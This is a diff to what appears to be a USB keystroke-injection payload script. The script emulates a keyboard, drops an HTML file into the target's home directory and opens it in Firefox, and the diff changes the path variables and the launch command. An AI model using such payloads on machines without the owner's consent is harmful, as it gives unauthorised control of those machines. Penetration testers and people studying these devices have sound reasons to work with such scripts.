@@ -22,16 +22,14 @@
 ATTACKMODE HID
 LED SETUP
 
-payload_dir=/root/udisk/payloads/$SWITCH_POSITION
-source_html=$payload_dir/index.min.html
-target_html=\~\/index.html
-
+source_html="/root/udisk/payloads/${SWITCH_POSITION}/index.min.html"
+target_html="~/index.html"
+#date_time=
 
 LED ATTACK
 
-DROP LINUX $source_html $target_html
+DROP $source_html $target_html
+RUN LINUX "firefox ${target_html}"
 
-Q STRING firefox "$target_html"
 Q ENTER
-
 LED FINISH
